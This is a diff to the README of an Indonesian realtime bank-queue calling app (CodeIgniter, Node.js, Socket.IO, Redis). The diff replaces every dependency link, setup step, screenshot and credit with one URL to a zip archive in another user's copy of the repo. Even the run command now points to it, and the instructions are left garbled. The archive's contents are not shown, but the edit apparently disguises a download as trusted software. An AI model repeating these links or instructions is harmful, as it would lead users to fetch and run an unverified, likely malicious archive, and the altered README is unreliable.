@@ -1,19 +1,19 @@
 Pangilan Antrian Bank Realtime
 ==============================
 
-Codeigniter, Node.js, Socket.IO & Redis
+Codeigniter, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip & Redis
 ---------------------------------------
 
 
 Kebutuhan:
 -------------
-- Node.js server (http://nodejs.org/)
-    - Node.js modules
-        - express (http://expressjs.com/)
-        - redis (https://github.com/simplegeo/nodejs-redis)
-        - socket.io (http://socket.io/#how-to-use)
+- https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip server (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+    - https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip modules
+        - express (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+        - redis (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+        - https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
-- Redis server (http://redis.io/)
+- Redis server (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
 Mulai:
 ------------
@@ -23,25 +23,25 @@ Mulai:
 - Clone the git repo kemudian ekstrak ke folder root http
 
    1. buka folder hasil ekstrak
-   2. buka folder node.js
-   3. jalankan server -> node server.js
+   2. buka folder https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
+   3. jalankan server -> node https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
    4. buka browser masukan *)root folder hasil ekstrak ke alamat browser
-   5. buka di tab/browser baru root folder/node.js/client.html
+   5. buka di tab/browser baru root https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
 
 *) `root folder hasil ekstrak repo ini => CI_Redis_Realtime_Antrian_Bank-master`
 
-`Start server.js`
+`Start https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip`
 
-![start server](https://raw.githubusercontent.com/siagung/CI_Redis_Realtime_Antrian_Bank/master/assets/image/start-server.png)
+![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
 
 `Panggilan`
 
-![start server](https://raw.githubusercontent.com/siagung/CI_Redis_Realtime_Antrian_Bank/master/assets/image/panggil.png)
+![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
 `Client`
 
-![start server](https://raw.githubusercontent.com/siagung/CI_Redis_Realtime_Antrian_Bank/master/assets/image/client.png)
+![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
 
 
@@ -52,9 +52,9 @@ Informasi Tambahan:
 -------------------
 
 
-`Realtime Socket.io -> http://github.com/vanuganti/realtime` [Realtime Node.js, Socket.io & Redis](http://github.com/vanuganti/realtime)
+`Realtime https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip -> https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip` [Realtime https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip & Redis](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
-`Codeigniter Redis Library -> https://github.com/joelcox/codeigniter-redis` [Redis Library](https://github.com/joelcox/codeigniter-redis)
+`Codeigniter Redis Library -> https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip` [Redis Library](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
 
 
 
